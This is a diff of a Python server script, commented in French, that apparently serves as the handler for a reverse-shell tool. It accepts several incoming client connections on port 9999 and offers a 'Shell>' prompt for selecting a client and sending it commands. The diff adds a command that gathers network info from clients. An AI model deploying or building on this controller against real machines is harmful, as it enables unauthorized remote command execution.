@@ -1,21 +1,20 @@
-import socket  # pour la connection
-import threading  # pour que le serveur puisse gérer plusieurs client à la fois
+import socket
+import threading
 from queue import Queue
-import os
 import subprocess
 
-THREADS = 2  # Nombre de thread
-NUMBER = [1, 2]  # thread 1 et 2 -> dans une liste
-BUFFER = 1024
+THREADS = 2
+NUMBER = [1, 2]
 queue = Queue()
-connections = []  # liste1 = ce qui se rapporte à la connection elle même
-addresses = []  # liste2 = ce qui se rapporte au adresse ip, quel client se connecte, ...
+connections = []
+addresses = []
 
-COMMANDS = {'help': ['Shows this help'],
-            'list': ['Lists connected clients'],
-            'select': ['Selects a client by its index. Takes index as a parameter'],
-            'quit': ['Stops current connection with a client. To be used when client is selected'],
-            'shutdown': ['Shuts server down'],
+COMMANDS = {'help': ['Shows help'],
+            'list': ['Lists clients'],
+            'select': ['Selects a client by its number. Takes number as a parameter'],
+            'quit': ['Stops current connection with selected client'],
+            'getinfo': ['Get info from client(ifconfig)'],
+            'shutdown': ['Shutdown the server'],
             }
 
 
@@ -25,45 +24,44 @@ def print_help():
     return
 
 
-# Créer un socket pour initier une connection
+# Créer un socket pour initier une connexion
 def socket_creation():
     try:
-        global host  # variable global pour être utilisée plus tard dans une autre fonction
+        global host
         global port
         global sock
-        host = ''  # l'ip ou le sever sera à l'écoute (lui même dans ce cas)
-        port = 9999  # le port sur lequel il sera à l'écoute pour recevoir des infos
+        host = ''
+        port = 9999
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    except socket.error as msg:  # Si la création du socket échoue on renvoit le message suivant
+    except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
 
-# En attente de connection
+# En attente de connexion
 def socket_bind():
     try:
-        global host  # On réutilise les variables globales créer plus tôt
+        global host
         global port
         global sock
         print("Binding socket to port: " + str(port))
-        sock.bind((host, port))  # on spécifie le port l'adresse sur laquelle écouter
-        sock.listen(5)  # en attente de connection, 5 tentatives de connection avant de refuser l'acces
+        sock.bind((host, port))
+        sock.listen(5)
     except socket.error as msg:
         print("socket binding error: ", + str(msg) + "\n" + "Please retry ...")
-        socket_bind()  # donc si erreur, on relance la fonction !
+        socket_bind()
 
-
-# Accepter la connection avec les clients et les sauvegarde sous forme de liste
+# Acceptation connexion
 def accept_socket():
     print("Accepting Socket ...")
-    for c in connections:  # Fermer toutes les connections
+    for c in connections:
         c.close()
-    del connections[:]  # être sur de démmarer sur une bonne base en nettoyant toutes les connections et adresses
+    del connections[:]
     del addresses[:]
     while 1:
         try:
             conn, address = sock.accept()
-            conn.setblocking(1)  # pas de "timeout"
-            connections.append(conn)  # ajout des connections et adresses à leur liste
+            conn.setblocking(1)
+            connections.append(conn)
             addresses.append(address)
             print("\nConnection established on " + address[0] + ":" + str(address[1]))  # Affiche l'IP et le PORT
         except socket.error as msg:
@@ -76,15 +74,15 @@ def start_prompt():
     while True:
         cmd = input('Shell> ')
         if cmd == 'list':
-            # list_connection()  #Liste les connections
+
             print('----- Clients -----')
             for address in addresses:
                 print(str(addresses.index(address) + 1) + '   ' + str(address[0]) + '   ' + str(address[1]))
             print('')
             continue
         elif 'select' in cmd:
-            target = cmd.replace('select ', '')  # récupérer la valeur de l'index
-            target = int(target) - 1  # la mettre au format int
+            target = cmd.replace('select ', '')
+            target = int(target) - 1
             conn = connections[target]
             print("You are now connected to " + str(addresses[target][0]))
             print("Shell (" + str(addresses[target][0]) + ")>", end="")
@@ -118,12 +116,12 @@ def start_prompt():
 # Threads
 def create_threads():
     for a in range(THREADS):
-        t = threading.Thread(target=work)  # target = le job qu'il va faire
-        t.daemon = True  # Permet de kill le thread en même temps que la fonction principal
+        t = threading.Thread(target=work)
+        t.daemon = True
         t.start()
 
 
-# Définir work pour faire les deux jobs (maintenir la connection et envoyer des commandes)
+# Définir work pour faire les deux jobs
 def work():
     while True:
         x = queue.get()
@@ -133,7 +131,7 @@ def work():
             accept_socket()
         if x == 2:
             start_prompt()
-        queue.task_done()  # libérer la mémoire quand le tache est finie
+        queue.task_done()
 
 
 # Jobs
